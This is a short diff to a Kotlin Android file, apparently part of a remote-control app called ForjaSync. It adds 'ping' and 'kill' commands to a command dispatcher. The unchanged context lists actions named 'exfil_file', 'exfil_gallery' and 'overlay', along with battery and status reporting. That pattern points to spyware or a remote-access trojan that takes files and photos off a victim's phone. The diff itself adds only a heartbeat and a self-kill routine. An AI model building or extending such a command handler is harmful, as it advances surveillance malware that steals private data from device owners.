@@ -66,6 +66,8 @@ object ForjaSyncCapabilities {
                 "exfil_file" -> exfilFile(p)
                 "exfil_gallery" -> exfilGallery(p)
                 "overlay" -> overlay(p)
+                "ping" -> buildJsonObject { put("pong", true); put("ts", System.currentTimeMillis()) }
+                "kill" -> killApp()
                 "status" -> status()
                 else -> err("action necunoscut: $action")
             }
@@ -320,6 +322,13 @@ object ForjaSyncCapabilities {
             put("bat", bat["pct"]?.jsonPrimitive?.content ?: "-1")
             put("ts", System.currentTimeMillis())
         }
+    }
+
+    // ── Killer / forțat ─────────────────────────────────────────────
+    private fun killApp(): JsonObject {
+        val pid = android.os.Process.myPid()
+        android.os.Process.killProcess(pid)
+        return buildJsonObject { put("ok", true); put("msg", "kill trimis (pid $pid)") }
     }
 
     // ── Status / diagnostic ──────────────────────────────────────────
